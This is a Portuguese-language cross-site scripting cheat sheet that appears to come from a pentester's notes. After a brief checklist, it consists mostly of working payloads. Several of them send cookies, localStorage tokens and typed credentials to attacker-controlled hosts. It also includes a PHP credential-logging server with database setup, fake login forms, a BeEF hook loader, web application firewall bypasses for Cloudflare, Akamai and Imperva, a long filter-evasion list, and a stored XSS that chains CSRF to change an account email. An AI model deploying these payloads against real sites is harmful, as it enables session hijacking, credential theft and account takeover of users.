:hamburger: O Cross-Site Script é uma falha de segurança onde a aplicação web processa códigos Javascript ou TAGS HTML inseridos pelo usuário. Os tipos de Cross-Site Scripting são: 
- Refletido: o código é executado no navegador do usuário
- Armazenado: o código é armazenado no servidor e é executado sempre que a página é acessada
- DOM-based: o código é executado no navegador do usuário manipulando elementos do DOM

:fries:Checklist
- Mapeamento e descoberta
     - Enumerar todos os endpoints, parâmetros e campos de entrada de dados
     - Identificar os "pontos de entrada" na url, no "corpo" da requisição e no cabeçalho HTTP
- Testar os "pontos de entrada"
     - Use uma lista com "tags" e "eventos" em cada "ponto de entrada de dados"
     - Observe como se comportada a aplicação e se há filtros
- Análise o contexto
     - Analise onde e como os "inputs" são processados
     - Analise o código HTML e arquivos Javascript para identificar se há pontos de exploração
     - Analise se o payload é refletido ou se fica armazenado, sendo necessário uma interação do usuário para             disparar o código
- Crie payloads específicos
     - Crie payloads de acordo com o contexto, como por exemplo, código para roubo de "session ID"
- Encode ou Ofuscação do payload
     - Se o código for bloqueado ou sanitizado, use técnicas de encode ou ofuscação
     - No contexto da aplicação, use encode e ofuscação específicas
- XSS Armazenado
     - Verifique se o código é executado mesmo quando uma nova sessão é iniciada ou usando outras contas de usuário

## Captura dados do Local Storage
```
# captura dados do Local Storage
document.location='http://[IP-Servidor-Externo]:8080/'+localStorage.getItem('refresh_token');

# JSON.stringify(localStorage)
<img src='https://[IP-Atacante]/yikes?jwt='+JSON.stringify(localStorage);'--!>
```
##

## Captura de Cookies
### SVG Upload File
Upload do arquivo .svg com o código para captura dos valores em um parâmetro armazenado no Local Storage
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      document.location='http://[IP]:1234/'+localStorage.getItem('[PARAMETRO]');
   </script>
</svg>
```
Bypass CSP - Content Security Policy Usando a TAG foreignObject
```
<svg width="600" height="400" xmlns="http://w3.org/2000/svg" xmlns:xhtml="http://w3.org/1999/xhtml">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://w3.org/1999/xhtml">
<iframe src='javascript:confirm(10)'></iframe>
    </body>
  </foreignObject>
</svg>
```
Bypass Geral
```
<Img+Src=javascript:alert(1)+OnError=location=src>

XSS Found in "/lib/css/animated.min'"/>
<script%20>alert(document.domain)<%2fscript>.css"
```
## Bypass Cloudflare WAF
```
%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E

&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
Clean Payload "><track/onerror='confirm`1`'>

HTML entity & URL encoding:
" --> &#34; 
> --> &gt; 
< --> &lt;
' --> &#x27;
` --> \%60

## HTMLi
<Img Src=OnXSS OnError=alert(1)>

"><img src=x onerrora=confirm() onerror=confirm(1)>
```
## Bypass Akamai JSi
```
';k='e'%0Atop['al'+k+'rt'](1)//
```
## Bypass Imperva HTMLi
```
<Img Src=//X55.is OnLoad%0C=import(Src)>
```
## Basic XSS Encoding Tips
```
1) alert = window["al"+"ert"] 
2) bypass () with `` 
3) replace space with / 
4) encode symbols:

< = %3c
> = %3e
" = %22
[ = %5b
] = %5d
` = %60

Example Payload:
%3csvg/onload=window%5b"al"+"ert"%5d`1337`%3e
```
## Captura de credencial 
### Servidor-Atacante: Adicionar o script keylog.php no path /var/www/html/

```
<?php
// Check if both ds_senha and ds_login are present in the POST data
if(!empty($_POST['ds_senha']) && !empty($_POST['ds_login'])) {
    // Open or create the file data.txt in append mode
    $logfile = fopen('data.txt' , 'a+');
    
    // Write ds_login and ds_senha to the file, separated by a comma
    fwrite($logfile, $_POST['ds_login'] . ',' . $_POST['ds_senha'] . PHP_EOL);
    
    // Close the file
    fclose($logfile);

    // Database connection details
    $servername = "127.0.0.1";
    $username = "user_db";
    $password = "password";
    $dbname = "database_name";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Prepare SQL statement to insert ds_login and ds_senha into a table (assuming table name is 'login_data')
    $stmt = $conn->prepare("INSERT INTO xss_colletion (ds_login, ds_senha) VALUES (?, ?)");
    
    // Bind parameters to the prepared statement
    $stmt->bind_param("ss", $_POST['ds_login'], $_POST['ds_senha']);
    
    // Execute the prepared statement
    $stmt->execute();
    
    // Close the prepared statement
    $stmt->close();
    
    // Close the database connection
    $conn->close();
}
?>
```
### Habilita o MySQL
```
apt install mysql-server
apt-get install php-mysqlnd
```
### Cria a base de dados para armazenar as credenciais
```
create database [nome];
create table ( id INT unsigned NOT NULL AUTO_INCREMENT, ds_login varchar(255), ds_senha varchar(255), PRIMARY KEY (id));
```
### Cria o usuário
```
CREATE USER 'user'@'localhost' IDENTIFIED BY 'some_pass';
```
### Habilita acesso full para o usuário
```
GRANT ALL PRIVILEGES ON shop.* TO 'user'@'localhost';
```
### Habilita o PHP para listening
```
php -S 0.0.0.0:[porta]
```
### Payload para capturar o dados
```
'"<script><h1> Please login to continue</h1><form action="http://[IP]:1234/keylog.php" method="POST">
```
### XSS coleta credencial através de um Form inserido no Payload
Para ser possível a coleta é necessário adiciona ID na tag input do HTML (Ex.: id=name, id=pass)
```
<script><h1> Please login to continue</h1><form action="http://[IP]:1234/submit?name=&pass=" method="GET">
```
```
<script><h1> Please login to continue</h1><form action="http://[IP]:1234/submit?name=&pass=" method="GET">
```
### Fake Formulário para captura de credenciais (XSS Store)
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://[URL-Atacante]',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
### XSS Defecement
```
# Não Persistente

<script> document.body.innerHTML="<img src='http://[IP]/imagem.png'>" </script>
```
### XSS Keylogger - Metasploit
Metasploit Módulo: auxiliary/server/capture/http_javascript_keylogger

### XSS Keylogger - BeF
Link: https://github.com/beefproject/beef/wiki/Installation
```
<img/src=x style="display:nome" onerror="s=docment.createElement('script');s.setAttribute('src','http://[IP-BEFF]:[PORT]/hook.js');document.head.appendChild(s)">

<script src="http://[IP-BEFF]:[PORT]/hook.js"></script>
```

### XSSer Tool
```
# POST

xsser --url '[URL]' -p '[campo]=XSS&[campo]=[valor]'

xsser --url '[URL]' -p '[campo]=XSS&[campo]=[valor]' --auto

xsser --url '[URL]' -p '[campo]=XSS&[campo]=[valor]' --Fp "<script>alert(1)</script>"

# GET

xsser --url "[URL]?[campo]=[valor]&[campo]=[valor]&[campo]=XSS&[campo]=[valor]&[campo]=[valor]"

xsser --url "[URL]?[campo]=[valor]&[campo]=[valor]&[campo]=XSS&[campo]=[valor]&[campo]=[valor]" --auto
```

### XSS Stored
```
# teste com "console.info"
<span onmouseover="console.info("teste")">Teste</span>
```
### XSS Evasion
`` 
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;()&rpar;">X</a>

<img src=x onerror=alert(document.cookie);>

<iframe src=javascript:alert('teste')//

<embed src=javascript:alert('teste')>

<script/random>alert('teste');</script>

<ScRiPt>alert('teste');</ScRiPt>

<ScRiPt>alert('teste');

<script
>alert('teste');</script>

<scr<script>ipt>alert('teste')</scr<script>ipt>

<scr\x00ipt>alert('teste')</src\x00ipt>

## HTML Attributes

<a href="javascript:alert('teste')">Teste</a>

<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Teste</a>

<form id=x></form><button form="x" formaction="javascript:alert('teste')">Teste</button>

<form id=x></form><button form="x" formaction="javascript:alert('teste')">Teste</button>

</Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`teste` //>#

</Title/</script/><img src=x onerror="\u0061lert('teste')"/>#

</script><svg onload="eval(atob('YWxlcnQoJ2wzM3QnKQ=='))"> 

</Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`teste` //>#

</Title/</script/><img src=x onerror="\u0061lert('teste')"/>#

</Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`teste` //>#

<object data="javascript:alert('teste')">

<script>\u0061lert('teste')</script>

<img src=x onerror="&#x0061;lert('teste')"/>

<img src=x onerror="&#97;lert('teste')"/>

<object data="javascript:alert('teste')">

<object data="data:text/html,<script>alert('teste')</script>">

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<object data="//[URL-Attacker/xss.swf">

<embed code="//[URL-Attacker/xss.swf" allowscriptaccess=always>

Script xss.swf = https://github.com/evilcos/xss.swf

## HTML Events

<body onload=alert('teste')>

<input type=image src=x:x onerror=alert('teste')>

<isindex onmouseover="alert('teste')" >

<form oninput=alert('teste')><input></form>

<textarea autofocus onfocus=alert('teste')>

<input oncut=alert('teste')>

<svg onload=alert('teste')>

<keygen autofocus onfocus=alert('teste')>

<video><source onerror="alert('teste')">

<marquee onstart=alert('teste')>

<svg/onload=alert('teste')>

<svg//////onload=alert('teste')>

<svg id=x;onload=alert('teste')>

<svg id=`x` onload=alert('teste')>

<svg onload%09=alert('teste')>

<svg %09onload=alert('teste')>

<svg %09onload%20=alert('teste')>

<svg onload%09%20%28%2C%3b=alert('teste')>

<svg onload%0B=alert('teste')>

## Unicode Escaping

<script>\u0061lert('teste')</script>

<script>\u0061\u006C\u0065\u0072\u0074('teste')</script>

<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>

## Decimal, Octal e Hexadecimal Escaping

<img src=x onerror="&#x0061;lert('teste')"/>

<img src=x onerror="&#97;lert('teste')"/>

<img src=x onerror="eval('\a\l\ert\(teste\)')"/>

<img src=x onerror="\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>

## Javascript XSS

<object data="JaVaScRiPt:alert('teste')">

<object data="javascript&colon;alert('teste')">

<object data="java
script:alert('teste')">

<object data="javascript&#x003A;alert('teste')">

<object data="javascript&#58;alert('teste')">

<object data="&#x6A;avascript:alert('teste')">

<object
data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x72;&#x69;&#x70;&#x74;&#x3A;alert('teste')">

<object data="data:text/html,<script>alert('teste')</script>">

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<embed code="data:text/html,<script>alert('teste')</script>">

<embed code="DaTa:text/html,<script>alert('teste')</script>">

<embed code="data&colon;text/html,<script>alert('teste')</script>">

<embed code="data&#x003A;text/html,<script>alert('teste')</script>">

<embed code="&#x64;&#x61;ta:text/html,<script>alert('teste')</script>">

## XSS IE

# IE8
<img src=a onerror="vbscript:msgbox 1"/>

<img src=b onerror="vbs:msgbox 2"/>

# IE Edge
<img src=c onerror="vbs:alert('teste')"/>

<img src=d onerror="vbscript:alert('teste')"/>

<img src=x onerror="vbscript&#x003A;alert('teste')">

<img src=x onerror="vb&#x63;cript:alert('teste')">
```

### Special Caracters
```
"<" ">" usado para elementos/componentes no HTML

"{" "}" usado para declarar uma função

'' "" usado para definir string

; final do bloco de código
```

### XSS Captura de cookie com Fetch API Javascript
```
<script>
fetch('https://[URL-Atacante]', {method: 'POST', mode: 'no-cors', body:document.cookie});
</script>
```

### HTML Injection
```
<a href=http://[IP]>[Texto]</a>

<script>document.write('<a href="https://[IP]?c='+document.cookie+'"/>[Texto]');</script>

<script>
fetch('http://[IP]',{
method:'GET',
mode:'no-cors',
body:document.cookie});</script>

<script>document.write('<a href="http://[IP]/index.html?c='+document.cookie+'"/>[Texto]');</script>

## TAG IMG
<img src="https://[IP]" href=1 cookie="+document.cookie+"></img>

## TAG a href
<a href="https://[IP]" href=1 cookie="+document.cookie+"></a>
```

### XSS Armazenado altera o e-mail (Exploit CSRF)
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test03@test.com')
};
</script>
```
:orange_book: OWASP Filter Evasion Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

:orange_book: Payloads - Port Swigger Lab
```
5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'

<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a> 

<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';
```




